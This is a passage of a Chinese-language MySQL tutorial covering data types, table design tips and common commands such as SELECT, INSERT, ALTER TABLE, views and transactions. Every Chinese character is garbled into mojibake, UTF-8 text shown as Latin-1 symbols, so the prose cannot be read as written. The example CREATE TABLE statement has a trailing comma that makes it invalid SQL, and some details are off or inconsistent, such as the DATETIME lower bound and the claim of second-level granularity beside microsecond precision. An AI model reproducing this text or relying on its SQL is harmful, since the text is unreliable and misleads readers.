æ—¥æœŸæ—¶é—´å‹</h4><ul><li>MySQLèƒ½å­˜å‚¨çš„æœ€å°æ—¶é—´ç²’åº¦ä¸ºç§’ã€‚</li><li><code>DATETIME([fsp])``TIMESTAMP[(fsp)]``TIME[(fsp)]</code>å¯è®¾å®šä¸€ä¸ª0~6ä½çš„å¾®ç§’æ—¶é—´ã€‚</li><li>DATETIMEèƒ½ä¿å­˜å¤§èŒƒå›´çš„å€¼ï¼Œç²¾åº¦ä¸ºç§’ï¼Œå¯ä¿å­˜1001~9999å¹´ã€‚è¯¥ç±»å‹å­˜å‚¨ä¸æ—¶åŒºæ— å…³ï¼Œä½¿ç”¨8ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´ã€‚</li><li>TIMESTAMPåªä½¿ç”¨4ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´ï¼Œå› æ­¤åªèƒ½ä¿å­˜1970~2038å¹´ï¼ŒMySQLä¸­ä¹Ÿæä¾›äº†FROM_UNIXTIME()å‡½æ•°æŠŠUnixæ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸï¼Œå¹¶æä¾›äº†UNIX_TIMESTAMP()å‡½æ•°å°†æ—¥æœŸè½¬æ¢ä¸ºUnixæ—¶é—´æˆ³ã€‚</li><li>MySQL 4.1åŠä»¥ä¸Šç‰ˆæœ¬æŒ‰ç…§DATETIMEçš„æ–¹å¼æ ¼å¼åŒ–æ˜¾ç¤ºTIMESTAMPçš„å€¼ï¼Œè¿™åªæ˜¯æ˜¾ç¤ºä¸Šçš„åŒºåˆ«ï¼Œä¸4.1å‰çš„ç‰ˆæœ¬åœ¨å­˜å‚¨ä¸Šå¹¶æ²¡æœ‰åŒºåˆ«ã€‚</li><li>TIMESTAMPé»˜è®¤ä¸ºNOT NULL</li></ul><h4 id="1-2-4-ä½æ•°æ®å‹"><a href="#1-2-4-ä½æ•°æ®å‹" class="headerlink" title="1.2.4 ä½æ•°æ®å‹"></a>1.2.4 ä½æ•°æ®å‹</h4><p>ä»MySQL 5.0å¼€å§‹ï¼Œæ–°å¢BITæ•°æ®ç±»å‹ï¼Œè¯¥ç±»å‹å¯ç”¨äºå­˜å‚¨ä¸€ä¸ªæˆ–å¤šä¸ªtrue/falseå€¼ï¼ŒBIT(1)å®šä¹‰ä¸€ä¸ªåŒ…å«å•ä¸ªä½çš„å­—æ®µï¼ŒBIT(2)å­˜å‚¨2ä¸ªä½â€¦â€¦BITåˆ—çš„æœ€å¤§é•¿åº¦æ˜¯64ä¸ªä½ã€‚ä½†BITç±»å‹åº”è¯¥è°¨æ…ä½¿ç”¨ï¼Œå¯¹äºå¤§éƒ¨åˆ†åº”ç”¨ï¼Œæœ€å¥½é¿å…ä½¿ç”¨è¿™ç§ç±»å‹ã€‚</p><p>åœ¨æ•°æ®è¡¨ä¸­ï¼Œä¸€æ—¦é€‰å®šäº†å­—æ®µç±»å‹ï¼Œå°±è¦ç¡®ä¿åœ¨æ‰€æœ‰å…³è”è¡¨ä¸­éƒ½ä½¿ç”¨åŒæ ·çš„æ•°æ®ç±»å‹ã€‚</p><h3 id="1-3-æ•°æ®è¡¨è®¾è®¡éœ€æ³¨æ„çš„"><a href="#1-3-æ•°æ®è¡¨è®¾è®¡éœ€æ³¨æ„çš„" class="headerlink" title="1.3 æ•°æ®è¡¨è®¾è®¡éœ€æ³¨æ„çš„"></a>1.3 æ•°æ®è¡¨è®¾è®¡éœ€æ³¨æ„çš„</h3><ol><li>å¤ªå¤šçš„åˆ—ã€‚è¿‡å¤šçš„åˆ—ï¼ˆå¦‚æ•°åƒä¸ªï¼‰ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚</li><li>å¤ªå¤šçš„å…³è”ã€‚MySQLé™åˆ¶äº†æ¯ä¸ªå…³è”æ“ä½œæœ€å¤šåªèƒ½æœ‰61å¼ è¡¨ã€‚ä¸€ä¸ªç²—ç•¥çš„ç»éªŒæ³•åˆ™ï¼Œå¦‚æœå¸Œæœ›æŸ¥è¯¢æ‰§è¡Œå¾—åˆ°å¿«é€Ÿä¸”å¹¶å‘æ€§å¥½ï¼Œå•ä¸ªæŸ¥è¯¢æœ€å¥½åœ¨12ä¸ªè¡¨ä»¥å†…åšå…³è”ã€‚</li><li>é˜²æ­¢è¿‡åº¦ä½¿ç”¨æšä¸¾ï¼ˆENUMï¼‰ã€‚å¦‚ï¼šcountry enum(â€˜â€™,â€™0â€™,â€™1â€™,â€™2â€™,â€¦,â€™31â€™)</li><li><strong>å°½é‡é¿å…ä½¿ç”¨null</strong>ï¼Œå»ºè®®å°½å¯èƒ½ä½¿ç”¨æ›¿ä»£æ–¹æ¡ˆã€‚å³ä½¿éœ€è¦å­˜å‚¨ä¸€ä¸ªäº‹å®ä¸Šçš„â€˜ç©ºå€¼â€™æ—¶ï¼Œå¯ä»¥ä½¿ç”¨0ï¼Œç©ºå­—ç¬¦ä¸²æˆ–å…¶ä»–ç‰¹æ®Šå€¼æ¥ä»£æ›¿ã€‚ä½†ä¹Ÿä¸è¦èµ°æç«¯ï¼Œå½“ç¡®å®éœ€è¦è¡¨ç¤ºæœªçŸ¥å€¼æ—¶ï¼Œä½¿ç”¨nullä¹Ÿæ¯”ä½¿ç”¨å¥‡æ€ªçš„å€¼å¥½ï¼Œæ¯”å¦‚ä½¿ç”¨å…¨0ä½œæ—¥æœŸæ—¶é—´ä¼šå¯¼è‡´å¾ˆå¤šé—®é¢˜ï¼Œå¯ä»¥é…ç½®MySQLçš„SQL_MODEæ¥ç¦æ­¢ä¸å¯èƒ½çš„æ—¥æœŸã€‚</li></ol><h2 id="äºŒã€å¸¸ç”¨å‘½ä»¤"><a href="#äºŒã€å¸¸ç”¨å‘½ä»¤" class="headerlink" title="äºŒã€å¸¸ç”¨å‘½ä»¤"></a>äºŒã€å¸¸ç”¨å‘½ä»¤</h2><h3 id="2-1-åŸºç¡€å‘½ä»¤"><a href="#2-1-åŸºç¡€å‘½ä»¤" class="headerlink" title="2.1 åŸºç¡€å‘½ä»¤"></a>2.1 åŸºç¡€å‘½ä»¤</h3><ol><li>æŸ¥è¯¢æ•°æ®ï¼š<code>SELECT [DISTINCT] å­—æ®µ [AS åˆ«å] FROM è¡¨å [JOIN è¡¨å2 ON æ¡ä»¶] [WHERE æ¡ä»¶(LIKE|AND|OR|BETWEEN|IN|NOT IN|EXISTS|NOT EXISTS)] [GROUP BY å­—æ®µ [HAVING æ¡ä»¶]] [ORDER BY å­—æ®µ [DESC]] [LIMIT [OFFSET,]æ¡æ•°]ï¼›</code>ï¼ˆ<strong>æ³¨æ„ä½¿ç”¨<code>GROUP BY</code>æ—¶æ‰€æœ‰çš„<code>SELECT</code>çš„å­—æ®µéƒ½è¦åˆ—å‡º</strong>ï¼‰</li></ol><ul><li>åœ¨å¤„ç†SQLè¯­å¥æ—¶ï¼Œæ‰€æœ‰çš„ç©ºæ ¼éƒ½ä¼šè¢«å¿½ç•¥ï¼Œå› æ­¤SQLè¯­å¥å¯ä»¥æ¢è¡Œä»¥å¢å¼ºæ˜“è¯»æ€§ã€‚</li><li>ä¸€èˆ¬è€Œè¨€ï¼Œé™¤éä½ ç¡®å®éœ€è¦è¡¨ä¸­çš„æ¯ä¸€åˆ—ï¼Œå¦åˆ™æœ€å¥½åˆ«ä½¿ç”¨<code>*</code>é€šé…ç¬¦ã€‚è™½ç„¶ä½¿ç”¨é€šé…ç¬¦èƒ½è®©ä½ çœäº‹ï¼Œä½†æ£€ç´¢ä¸éœ€è¦çš„åˆ—ä¼šé™ä½æ£€ç´¢å’Œåº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</li><li><code>DESC</code>å…³é”®å­—åªåº”ç”¨åˆ°ç›´æ¥ä½äºå…¶å‰é¢çš„åˆ—åã€‚å¦‚æœæƒ³åœ¨å¤šä¸ªåˆ—ä¸Šè¿›è¡Œé™åºæ’åºï¼Œå¿…é¡»å¯¹æ¯ä¸€åˆ—æŒ‡å®š<code>DESC</code>å…³é”®å­—ã€‚</li><li>ç¡®å®šå€¼æ˜¯å¦ä¸º<code>NULL</code>æ—¶ï¼Œä¸èƒ½ç®€å•çš„æ£€æŸ¥æ˜¯å¦= NULLï¼Œåº”è¯¥ä½¿ç”¨<code>IS NULL</code>ã€‚æ³¨æ„<code>NULL</code>ä¸<code>&#39;&#39;</code>ä¸åŒï¼Œ<code>NULL</code>è¡¨ç¤ºç©ºå€¼ï¼Œè€Œ<code>&#39;&#39;</code>æ˜¯ä¸€ä¸ªå€¼ã€‚</li><li><code>IN</code>æ“ä½œç¬¦å®Œæˆäº†ä¸<code>OR</code>ç›¸åŒçš„åŠŸèƒ½ã€‚<code>IN</code>æ“ä½œç¬¦çš„è¯­æ³•æ›´æ¸…æ™°ã€ç›´è§‚ã€‚<code>IN</code>æ“ä½œç¬¦ä¸€èˆ¬æ¯”ä¸€ç»„<code>OR</code>æ“ä½œç¬¦æ‰§è¡Œçš„æ›´å¿«ã€‚</li><li>åˆ«åå¯ä»¥æ˜¯ä¸€ä¸ªå•è¯æˆ–å¤šä¸ªå•è¯ï¼Œå¤šä¸ªå•è¯æ—¶è¦åœ¨å¼•å·ä¸­ï¼Œä½†åˆ«åæœ€å¥½ç”¨ä¸€ä¸ªå•è¯ã€‚<strong>è¡¨åˆ«åä¹Ÿå¯ä»¥å®ç°è‡ªèº«çš„è”è¡¨æŸ¥è¯¢</strong>ã€‚</li><li>å•æ¡æŸ¥è¯¢æ¡ä»¶ç”¨<code>WHERE</code>ï¼Œåˆ†ç»„æŸ¥è¯¢æ¡ä»¶ç”¨<code>HAVING</code>ï¼Œè”è¡¨æŸ¥è¯¢æ¡ä»¶ç”¨<code>ON</code>ã€‚</li><li>è”è¡¨æŸ¥è¯¢æ—¶ï¼Œè”ç»“çš„è¡¨è¶Šå¤šï¼Œæ€§èƒ½ä¸‹é™ä¹Ÿè¶Šå¤šã€‚</li><li>ç»„åˆæŸ¥è¯¢ï¼ˆUNIONï¼‰ä»æŸ¥è¯¢ç»“æœé›†ä¸­è‡ªåŠ¨å»é™¤äº†é‡å¤çš„è¡Œï¼Œä½¿ç”¨<code>UNION ALL</code>ï¼ŒDBMSä¸å–æ¶ˆé‡å¤çš„è¡Œã€‚</li><li><code>UNION</code>å‡ ä¹æ€»æ˜¯å®Œæˆä¸å¤šä¸ª<code>WHERE</code>æ¡ä»¶ç›¸åŒçš„å·¥ä½œã€‚<code>UNION ALL</code>ä¸º<code>UNION</code>çš„ä¸€ç§å½¢å¼ï¼Œå®ƒå®Œæˆ<code>WHERE</code>å­å¥å®Œæˆä¸äº†çš„å·¥ä½œã€‚å¦‚æœç¡®å®éœ€è¦æ¯ä¸ªæ¡ä»¶çš„åŒ¹é…è¡Œå…¨éƒ¨å‡ºç°ï¼ˆåŒ…æ‹¬é‡å¤è¡Œï¼‰ï¼Œå°±å¿…é¡»ä½¿ç”¨<code>UNION ALL</code>ï¼Œè€Œä¸æ˜¯<code>WHERE</code>ã€‚</li><li>åœ¨æŸäº›SQLä¸­ï¼Œ<code>INSERT INTO</code>ä¸­çš„<code>INTO</code>æ˜¯å¯é€‰çš„ï¼Œä½†ä¸ºäº†ä¿è¯SQLçš„ç§»æ¤æ€§ï¼Œæœ€å¥½ä¸è¦çœç•¥è¯¥å…³é”®å­—ã€‚</li><li>MySQLä¸­å¯ä»¥è¿›è¡Œç®—æ•°è¿ç®—ï¼Œå¦‚å¸¸è§çš„åŠ ã€å‡ã€ä¹˜ã€é™¤ã€‚</li><li><strong>åœ¨æ•°æ®è¡¨ä¸­ï¼ŒIDå­—æ®µæœ€å¥½æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä»¥ç¡®ä¿å”¯ä¸€ã€å‡†ç¡®ã€‚</strong></li><li>æ— è®ºæ˜¯åœ¨ç¼–å†™SQLè¿˜æ˜¯æ™®é€šä»£ç æ—¶ï¼Œåº”è¯¥å¤šåŠ æ³¨é‡Šï¼Œæ³¨é‡Šå¹¶ä¸ä¼šå½±å“æ€§èƒ½ï¼Œä½†èƒ½è®©è‡ªå·±å’Œåˆ«äººæ›´å®¹æ˜“ç†è§£å’Œæ›´å®‰å…¨çš„ä¿®æ”¹ä»£ç ã€‚</li><li><code>EXISTS|NOT EXISTS (ä»å¥)</code>æ¡ä»¶è¿”å›çš„æ˜¯å¸ƒå°”å€¼</li></ul><ol start="2"><li>æ’å…¥æ•°æ®ï¼š<code>INSERT|REPLACE [IGNORE] INTO è¡¨å(å­—æ®µ1ï¼Œå­—æ®µ2) VALUES(å€¼1ï¼Œå€¼2),(å€¼1ï¼Œå€¼2) [ON DUPLICATE KEY UPDATE å­—æ®µ=å€¼];</code></li></ol><ul><li>å¦‚æœæŸä¸ªå­—æ®µæ˜¯ä¸»é”®ç´¢å¼•æˆ–å”¯ä¸€ç´¢å¼•ï¼Œæ™®é€šçš„æ’å…¥è¯­å¥æ˜¯ä¼šæŠ¥é”™çš„ï¼Œè€Œä½¿ç”¨å…³é”®è¯<code>IGNORE</code>åˆ™ä¼šè­¦å‘Šï¼Œä½†ä¸ä¼šå½±å“æ­£å¸¸çš„æ‰§è¡Œï¼Œé‡å¤æ•°æ®ä»ç„¶æ²¡æœ‰æ’å…¥</li></ul><ol start="3"><li>æ›´æ–°æ•°æ®ï¼š<code>UPDATE è¡¨å SET å­—æ®µ1=å€¼1ï¼Œå­—æ®µ2=å€¼2 WHERE æ¡ä»¶;</code></li></ol><ul><li><strong><em>åœ¨<code>UPDATE</code>æˆ–<code>DELETE</code>è¯­å¥ä½¿ç”¨<code>WHERE</code>å­å¥å‰ï¼Œåº”è¯¥å…ˆç”¨<code>SELECT</code>è¿›è¡Œæµ‹è¯•ï¼Œä¿è¯å®ƒè¿‡æ»¤çš„æ˜¯æ­£ç¡®çš„è®°å½•ï¼Œä»¥é˜²ç¼–å†™çš„<code>WHERE</code>å­å¥ä¸æ­£ç¡®ã€‚</em></strong></li><li>å¦‚æœDBMSæ”¯æŒç¦æ­¢æ— <code>WHERE</code>çš„<code>UPDATE</code>å’Œ<code>DELETE</code>çš„æ‰§è¡Œï¼Œé‚£æœ€å¥½å¯ç”¨å®ƒã€‚</li></ul><ol start="4"><li>åˆ é™¤æ•°æ®ï¼š<code>DELETE FROM è¡¨å WHERE æ¡ä»¶;</code></li></ol><ul><li><code>DELETE</code>åˆ é™¤çš„æ˜¯è¡Œï¼Œè¦åˆ é™¤åˆ—ï¼Œä½¿ç”¨<code>UPDATE</code>è¯­å¥ã€‚</li><li>å¦‚æœæƒ³ä»è¡¨ä¸­åˆ é™¤æ‰€æœ‰è¡Œï¼Œå¯ä»¥ä½¿ç”¨<code>TRUNCATE TABLE</code>è¯­å¥æ¥ä»£æ›¿<code>DELETE</code>ï¼Œå®ƒå®Œæˆäº†ç›¸åŒçš„å·¥ä½œï¼Œä½†é€Ÿåº¦æ›´å¿«ï¼ˆå› ä¸ºä¸è®°å½•æ•°æ®çš„å˜åŠ¨ï¼‰ã€‚</li></ul><h3 id="2-2-æ•°æ®åº“"><a href="#2-2-æ•°æ®åº“" class="headerlink" title="2.2 æ•°æ®åº“"></a>2.2 æ•°æ®åº“</h3><ol start="5"><li>åˆ›å»ºæ•°æ®åº“ï¼š<code>CREATE DATABASE [IF NOT EXISTS] æ•°æ®åº“å;</code></li><li>åˆ é™¤æ•°æ®åº“ï¼š<code>DROP DATABASE [IF EXISTS] æ•°æ®åº“å;</code></li><li>æŸ¥çœ‹å»ºåº“è¯­å¥ï¼š<code>SHOW CREATE DATABASE æ•°æ®åº“å;</code></li><li>é€‰æ‹©æ•°æ®åº“ï¼š<code>USE æ•°æ®åº“å;</code></li><li>æŸ¥çœ‹æ•°æ®åº“ï¼š<code>SHOW DATABASES;</code></li><li>æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯ï¼š<code>STATUS;</code></li><li>è®¾ç½®å‘½ä»¤è¡Œå­—ç¬¦é›†ï¼š<code>SET NAMES UTF8;</code></li><li>æŸ¥çœ‹æ•°æ®è¡¨çš„æœ€åä¿®æ”¹æ—¶é—´ï¼š<code>select TABLE_NAME,UPDATE_TIME from INFORMATION_SCHEMA.tables where TABLE_SCHEMA=&#39;æ•°æ®åº“å&#39;;</code></li></ol><h3 id="2-3-æ•°æ®è¡¨"><a href="#2-3-æ•°æ®è¡¨" class="headerlink" title="2.3 æ•°æ®è¡¨"></a>2.3 æ•°æ®è¡¨</h3><ol start="13"><li>åˆ›å»ºæ•°æ®è¡¨ï¼š<code>CREATE TABLE [IF NOT EXISTS] æ•°æ®è¡¨å();</code></li></ol><ul><li><strong>ä¸ºæ¯ä¸€åˆ—è®¾ç½®é»˜è®¤å€¼ï¼Œä½¿ç”¨<code>DEFAULT</code>è€Œä¸æ˜¯<code>NULL</code>ã€‚</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'å§“å'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">COMMENT</span>=<span class="string">'ç”¨æˆ·è¡¨'</span>;</span><br></pre></td></tr></table></figure></li></ul><ol><li>æŸ¥çœ‹å»ºè¡¨è¯­å¥ï¼š<code>SHOW CREATE TABLE æ•°æ®è¡¨å;</code></li><li>æŸ¥çœ‹æ•°æ®è¡¨ï¼š<code>SHOW TABLES;</code></li><li>æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸‹æ•°æ®è¡¨çš„è‡ªå¢IDå€¼ï¼š<code>SHOW TABLE STATUS;</code></li><li>æŸ¥çœ‹è¡¨ç»“æ„ï¼š<code>DESC è¡¨å;</code>æˆ–<code>SHOW COLUMNS FROM è¡¨å;</code></li><li>åˆ é™¤æ•°æ®è¡¨ï¼š<code>DROP TABLE [IF EXISTS] æ•°æ®è¡¨å;</code></li></ol><p>-<strong>ä½¿ç”¨å…³ç³»è§„åˆ™é˜²æ­¢æ„å¤–åˆ é™¤ã€‚</strong>è®¸å¤šDBMSå…è®¸å¼ºåˆ¶å®æ–½æœ‰å…³è§„åˆ™ï¼Œé˜²æ­¢åˆ é™¤ä¸å…¶ä»–è¡¨ç›¸å…³è”çš„è¡¨ã€‚åœ¨å®æ–½è¿™äº›è§„åˆ™æ—¶ï¼Œå¦‚æœå¯¹æŸä¸ªè¡¨å‘å¸ƒä¸€æ¡<code>DROP TABLE</code>è¯­å¥ï¼Œä¸”è¯¥è¡¨æ˜¯æŸä¸ªå…³ç³»çš„ç»„æˆéƒ¨åˆ†ï¼Œåˆ™DBMSå°†é˜»æ­¢è¿™æ¡è¯­å¥æ‰§è¡Œï¼Œç›´åˆ°è¯¥å…³ç³»è¢«åˆ é™¤ä¸ºæ­¢ã€‚</p><ol start="19"><li>ä¿®æ”¹è¡¨åï¼š<code>RENAME TABLE æ—§è¡¨å TO æ–°è¡¨å;</code><br>####2.3.1 å¤åˆ¶è¡¨ç»“æ„å’Œæ•°æ®</li><li><strong>å¤åˆ¶è¡¨ç»“æ„ï¼š<code>CREATE TABLE æ–°è¡¨å LIKE åŸè¡¨å;</code></strong>(ä¸åŸè¡¨ç»“æ„ç›¸åŒï¼Œå»ºè¡¨è¯­å¥ç›¸åŒ)</li><li><strong>å¤åˆ¶è¡¨ç»“æ„åŠæ•°æ®åˆ°æ–°è¡¨ï¼š<code>CREATE TABLE è¡¨å SELECT * FROM è¡¨å;</code></strong>ï¼ˆæ³¨æ„è¯¥æ–¹å¼ä¸åŸè¡¨çš„ç»“æ„ä¼šæœ‰å·®å¼‚ï¼Œå»ºè¡¨è¯­å¥ä¸åŒï¼Œå¦‚è‡ªå¢ä¼šæ¶ˆå¤±ï¼‰</li><li>å¤åˆ¶æ•°æ®åˆ°å¦ä¸€å¼ è¡¨ï¼ˆç»“æ„ç›¸åŒï¼‰ï¼š<code>INSERT INTO è¡¨å SELECT * FROM è¡¨å;</code></li><li>å¤åˆ¶æ•°æ®åˆ°å¦ä¸€å¼ è¡¨ï¼ˆç»“æ„ä¸åŒï¼‰ï¼š<code>INSERT INTO è¡¨å(å­—æ®µ1ï¼Œå­—æ®µ2) SELECT å­—æ®µ1ï¼Œå­—æ®µ2 FROM è¡¨å;</code></li><li>æŸ¥çœ‹å­—æ®µç¼–ç ï¼š<code>SHOW FULL COLUMNS FROM è¡¨å;</code></li></ol><h3 id="2-4-å…¶å®ƒ"><a href="#2-4-å…¶å®ƒ" class="headerlink" title="2.4 å…¶å®ƒ"></a>2.4 å…¶å®ƒ</h3><h4 id="2-4-1-è§†å›¾"><a href="#2-4-1-è§†å›¾" class="headerlink" title="2.4.1 è§†å›¾"></a>2.4.1 è§†å›¾</h4><ol start="25"><li>åˆ›å»ºè§†å›¾ï¼š<code>CREATE VIEW è§†å›¾å AS SELECT ...;</code></li></ol><ul><li>è§†å›¾æ˜¯ä¸€å¼ è™šæ‹Ÿçš„è¡¨ã€‚</li></ul><ol start="26"><li>åˆ é™¤è§†å›¾ï¼š<code>DROP VIEW è§†å›¾å;</code></li></ol><h4 id="2-4-2-å­˜å‚¨è¿‡ç¨‹"><a href="#2-4-2-å­˜å‚¨è¿‡ç¨‹" class="headerlink" title="2.4.2 å­˜å‚¨è¿‡ç¨‹"></a>2.4.2 å­˜å‚¨è¿‡ç¨‹</h4><ol start="27"><li>åˆ›å»ºå­˜å‚¨è¿‡ç¨‹ï¼š<code>CREATE PROCEDURE å­˜å‚¨è¿‡ç¨‹å();</code></li><li>åˆ›å»ºå‡½æ•°ï¼š<code>CREATE FUNCTION å‡½æ•°å();</code></li></ol><h4 id="2-4-3-è§¦å‘å™¨"><a href="#2-4-3-è§¦å‘å™¨" class="headerlink" title="2.4.3 è§¦å‘å™¨"></a>2.4.3 è§¦å‘å™¨</h4><ol start="29"><li>æŸ¥çœ‹è§¦å‘å™¨ï¼š<code>SHOW TRIGGERS;</code></li><li>åˆ é™¤è§¦å‘å™¨ï¼š<code>DROP TRIGGER è§¦å‘å™¨å</code></li></ol><h4 id="2-4-4-äº‹åŠ¡"><a href="#2-4-4-äº‹åŠ¡" class="headerlink" title="2.4.4 äº‹åŠ¡"></a>2.4.4 äº‹åŠ¡</h4><ol start="31"><li>æŸ¥çœ‹äº‹åŠ¡å¼€å…³çŠ¶æ€ï¼š<code>SHOW VARIABLES LIKE &#39;autocommit&#39;;</code></li><li>æ‰“å¼€/å…³é—­äº‹åŠ¡çš„è‡ªåŠ¨æäº¤ï¼š<code>SET AUTOCOMMIT = 0|1;</code></li><li>åˆ›å»ºä¸´æ—¶è¡¨ï¼š<code>CREATE TEMPORARY TABLE è¡¨å();</code>ï¼ˆä¸´æ—¶è¡¨ä»…åœ¨å½“å‰è¿æ¥æœ‰æ•ˆï¼Œå½“å…³é—­è¿æ¥æ—¶ï¼ŒMySQLä¼šè‡ªåŠ¨åˆ é™¤è¡¨ã€‚ä¸´æ—¶è¡¨æ— æ³•ç”¨<code>SHOW TABLES</code>å‘½ä»¤æŸ¥çœ‹ï¼‰</li></ol><h4 id="2-4-5-ç³»ç»Ÿä¿¡æ¯"><a href="#2-4-5-ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="2.4.5 ç³»ç»Ÿä¿¡æ¯"></a>2.4.5 ç³»ç»Ÿä¿¡æ¯</h4><ol start="34"><li>æŸ¥çœ‹å½“å‰ç”¨æˆ·åï¼š<code>SELECT USER();</code></li><li>æŸ¥çœ‹å½“å‰æ•°æ®åº“ï¼š<code>SELECT DATABASE();</code></li><li>æŸ¥çœ‹MySQLç‰ˆæœ¬ï¼š<code>SELECT VERSION();</code></li></ol><h3 id="2-5-ALTER"><a href="#2-5-ALTER" class="headerlink" title="2.5 ALTER"></a>2.5 ALTER</h3><p>ALTERæ“ä½œæœ‰<code>ALTER TABLE</code>ï¼Œ<code>ALTER DATABASE</code>ï¼Œ<code>ALTER EVENT</code>ï¼Œ<code>ALTER PROCEDURE</code>ï¼Œ<code>ALTER VIEW</code>ç­‰å‘½ä»¤</p><h4 id="2-5-1-è¡¨çš„æ“ä½œ"><a href="#2-5-1-è¡¨çš„æ“ä½œ" class="headerlink" title="2.5.1 è¡¨çš„æ“ä½œ"></a>2.5.1 è¡¨çš„æ“ä½œ</h4><p><em>ä½¿ç”¨<code>ALTER TABLE</code>è¦æä¸ºå°å¿ƒï¼Œåº”è¯¥åœ¨è¿›è¡Œæ”¹åŠ¨å‰åšå®Œæ•´çš„å¤‡ä»½ï¼ˆæ¨¡å¼å’Œæ•°æ®çš„å¤‡ä»½ï¼‰ã€‚æ•°æ®åº“è¡¨çš„æ›´æ”¹ä¸èƒ½æ’¤é”€ï¼Œå¦‚æœå¢åŠ äº†ä¸éœ€è¦çš„åˆ—ï¼Œä¹Ÿè®¸æ— æ³•åˆ é™¤å®ƒä»¬ã€‚ç±»ä¼¼åœ°ï¼Œå¦‚æœåˆ é™¤äº†ä¸åº”è¯¥åˆ é™¤çš„åˆ—ï¼Œå¯èƒ½ä¼šä¸¢å¤±è¯¥åˆ—ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚</em></p><ol><li><strong>å¢åŠ å­—æ®µï¼š<code>ALTER TABLE è¡¨å ADD [COLUMN] å­—æ®µå å­—æ®µç±»å‹ [FIRST|AFTER å­—æ®µå];</code></strong></li><li><strong>ä¿®æ”¹å­—æ®µååŠç±»å‹ï¼š<code>ALTER TABLE è¡¨å CHANGE [COLUMN] æ—§å­—æ®µå æ–°å­—æ®µå å­—æ®µç±»å‹;</code></strong></li><li>ä¿®æ”¹å­—æ®µç±»å‹ï¼š<code>ALTER TABLE è¡¨å MODIFY å­—æ®µå ç±»å‹ [NOT NULL];</code></li><li><strong>åˆ é™¤å­—æ®µï¼š<code>ALTER TABLE è¡¨å DROP [COLUMN] å­—æ®µå;</code></strong></li><li><strong>æ·»åŠ æ™®é€š/å”¯ä¸€ç´¢å¼•ï¼š<code>ALTER TABLE è¡¨å ADD INDEX/UNIQUE ç´¢å¼•å(å­—æ®µ1[,å­—æ®µ2]);</code></strong></li></ol><ul><li>è¯·æ³¨æ„ï¼šå¯¹å¤šä¸ªå­—æ®µåŒæ—¶æ·»åŠ æ™®é€šç´¢å¼•æ—¶ï¼Œåªå¯¹è¿™äº›å­—æ®µéƒ½è¿›è¡Œæ£€ç´¢æ—¶ç´¢å¼•æ‰ä¼šç”Ÿæ•ˆï¼Œä»…å¯¹å…¶ä¸­ä»»ä½•ä¸€ä¸ªæ£€ç´¢éƒ½ä¸ä¼šæœ‰é¢„æœŸçš„æ•ˆæœã€‚</li></ul><ol><li>åˆ›å»ºçŸ­ç´¢å¼•ï¼š<code>CREATE INDEX ç´¢å¼•å ON è¡¨å(å­—æ®µ(é•¿åº¦));</code> æˆ–<code>KEY ç´¢å¼•å (å­—æ®µ(é•¿åº¦))</code> å¯¹äº<code>CHAR</code>å’Œ<code>VARCHAR</code>åˆ—ï¼Œåªç”¨å®ƒçš„ä¸€éƒ¨åˆ†æ¥åˆ›å»ºç´¢å¼•ï¼Œæ—¢å¯ä»¥èŠ‚çœç´¢å¼•ç©ºé—´ï¼Œåˆå¯ä»¥åŠ å¿«ç´¢å¼•é€Ÿåº¦ã€‚</li><li>æ·»åŠ ä¸»é”®ï¼š<code>ALTER TABLE è¡¨å ADD PRIMARY KEY (å­—æ®µå);</code></li></ol><ul><li>MySQLä¸­ä¸å…è®¸æœ‰å¤šä¸ªä¸»é”®</li><li>ä¸»é”®çš„ç‰¹ç‚¹ï¼šéç©ºä¸”å”¯ä¸€ï¼ŒæŒ‰éœ€æ·»åŠ è‡ªå¢</li><li>ä¸»é”®çš„åå­—å°±æ˜¯PRIMARY</li></ul><ol start="7"><li>è®¾ç½®ä¸»é”®çš„è‡ªå¢èµ·å§‹å€¼ï¼š<code>ALTER TABLE è¡¨å AUTO_INCREMENT = 100;</code></li><li>æ·»åŠ å¤–é”®ï¼š<code>ALTER TABLE è¡¨å ADD [CONSTRAINT [çº¦æŸå]] FOREIGN KEY (å­—æ®µ1[,å­—æ®µ2]) REFERENCES è¡¨å(å­—æ®µ1[,å­—æ®µ2]) [ON DELETE|UPDATE CASCADE|RESTRICT];</code></li></ol><ul><li><code>CASCADE</code>ï¼ˆçº§è”ï¼‰ï¼šå¦‚æœåˆ é™¤çˆ¶è¡¨ä¸­çš„æ•°æ®ï¼Œåˆ™å­è¡¨ä¸­çš„ç›¸åº”æ•°æ®ä¹Ÿä¸€åŒè¢«åˆ é™¤æˆ–æ›´æ–°</li><li><code>RESTRICT</code>ï¼ˆé™åˆ¶ï¼‰ï¼šå¦‚æœçˆ¶è¡¨å¯¹åº”çš„å­è¡¨ä¸­æœ‰ç›¸å…³çš„æ•°æ®ï¼Œåˆ™ä¸å…è®¸åˆ 